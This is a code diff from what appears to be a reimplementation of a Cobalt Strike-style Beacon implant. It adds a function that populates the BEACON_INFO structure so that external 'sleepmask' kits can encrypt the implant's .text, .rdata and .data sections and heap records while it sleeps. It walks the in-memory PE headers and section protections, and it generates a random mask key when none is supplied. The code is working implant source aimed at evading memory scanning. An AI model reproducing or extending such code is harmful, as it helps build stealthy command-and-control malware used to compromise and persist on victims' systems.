@@ -315,23 +315,104 @@ void beacon_sleep_mask_set_exec(char * ptr, DWORD text_size, DWORD total_size) {
 	g_sm_total = total_size;
 }
 
-void BeaconInformation(BEACON_INFO * info) {
-	static DWORD empty_sections[2] = { 0, 0 };
+/* The kit's sleepmask masks what this describes: in the PURPOSE_BEACON_MEMORY
+ * region, .text through mask_text_section (it flips RX -> RW itself when
+ * MaskSection is set), every other flagged section only while it is
+ * writable, plus the heap records. Protections are read off the live image
+ * so a mask decides exactly as it would with the official Beacon. The
+ * region's Cleanup stays FALSE: our exit path frees what it tracks itself
+ * before ExitThread, and the image is not the kit's to release. */
+void beacon_info_fill(BEACON_INFO * info, char * sm_base, DWORD sm_text, DWORD sm_total)
+{
+	unsigned char * base = (unsigned char *)get_beacon_ptr();
+	ALLOCATED_MEMORY_REGION * reg;
+	ALLOCATED_MEMORY_SECTION * s;
+	MEMORY_BASIC_INFORMATION mbi;
+	IMAGE_NT_HEADERS * nt;
+	IMAGE_SECTION_HEADER * sec;
+	int i, n, k;
+
 	if (info == NULL)
 		return;
 	memset(info, 0, sizeof(BEACON_INFO));
-	info->sleep_mask_ptr = g_sm_exec != NULL ? g_sm_exec : sleepmask_region;
-	info->sleep_mask_text_size = g_sm_text != 0 ? g_sm_text : 16384;
-	info->sleep_mask_total_size = g_sm_total != 0 ? g_sm_total : 16384;
-	info->beacon_ptr = (char *)get_beacon_ptr();
-	if (gparms != NULL) {
-		info->sections = gparms->sections;
-		memcpy(info->mask, gparms->mask, MASK_SIZE);
-	}
-	else {
-		info->sections = empty_sections;
-	}
+	info->version = 0x041300;
+	info->sleep_mask_ptr = sm_base != NULL ? sm_base : sleepmask_region;
+	info->sleep_mask_text_size = sm_text != 0 ? sm_text : SLEEPMASK_REGION_PATCH;
+	info->sleep_mask_total_size = sm_total != 0 ? sm_total : SLEEPMASK_REGION_PATCH;
+	info->beacon_ptr = (char *)base;
 	info->heap_records = track_memory_get_heap_records_to_mask();
+	if (gparms != NULL)
+		memcpy(info->mask, gparms->mask, MASK_SIZE);
+	else {
+		for (k = 0; k < MASK_SIZE; k++)
+			info->mask[k] = (char)bigger_rand();
+	}
+
+	reg = &info->allocatedMemory.AllocatedMemoryRegions[0];
+	reg->Purpose = AM_PURPOSE_BEACON_MEMORY;
+	reg->AllocationBase = base;
+	reg->CleanupInformation.AllocationMethod = AM_METHOD_VIRTUALALLOC;
+
+	if (base == NULL || base[0] != 'M' || base[1] != 'Z')
+		return;
+	nt = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
+	if (nt->Signature != IMAGE_NT_SIGNATURE)
+		return;
+	reg->RegionSize = nt->OptionalHeader.SizeOfImage;
+	if (VirtualQuery(base, &mbi, sizeof(mbi)) == sizeof(mbi))
+		reg->Type = mbi.Type;
+
+	/* the header page: described as it is - read-only, so the kit's XOR
+	 * leaves it alone */
+	s = &reg->Sections[0];
+	s->Label = AM_LABEL_PEHEADER;
+	s->BaseAddress = base;
+	s->VirtualSize = nt->OptionalHeader.SizeOfHeaders;
+	s->MaskSection = FALSE;
+	if (VirtualQuery(base, &mbi, sizeof(mbi)) == sizeof(mbi))
+		s->CurrentProtect = mbi.Protect;
+
+	sec = IMAGE_FIRST_SECTION(nt);
+	for (i = 0, n = 1; i < nt->FileHeader.NumberOfSections && n < 8; i++, sec++) {
+		unsigned char * p = base + sec->VirtualAddress;
+		if (VirtualQuery(p, &mbi, sizeof(mbi)) != sizeof(mbi))
+			continue;
+		s = &reg->Sections[n];
+		s->BaseAddress = p;
+		s->VirtualSize = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
+		s->CurrentProtect = mbi.Protect;
+		if (memcmp(sec->Name, ".text", 6) == 0) {
+			s->Label = AM_LABEL_TEXT;
+			s->MaskSection = TRUE;
+		}
+		else if (memcmp(sec->Name, ".rdata", 7) == 0) {
+			s->Label = AM_LABEL_RDATA;
+			s->MaskSection = TRUE;
+		}
+		else if (memcmp(sec->Name, ".data", 6) == 0) {
+			s->Label = AM_LABEL_DATA;
+			s->MaskSection = TRUE;
+		}
+		else if (memcmp(sec->Name, ".pdata", 7) == 0) {
+			s->Label = AM_LABEL_PDATA;
+			s->MaskSection = FALSE;
+		}
+		else if (memcmp(sec->Name, ".reloc", 7) == 0) {
+			s->Label = AM_LABEL_RELOC;
+			s->MaskSection = FALSE;
+		}
+		else {
+			s->Label = AM_LABEL_EMPTY;
+			s->MaskSection = FALSE;
+		}
+		n++;
+	}
+}
+
+BOOL BeaconInformation(BEACON_INFO * info)
+{
+	beacon_info_fill(info, g_sm_exec, g_sm_text, g_sm_total);
+	return TRUE;
 }
 
 void command_data_store(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
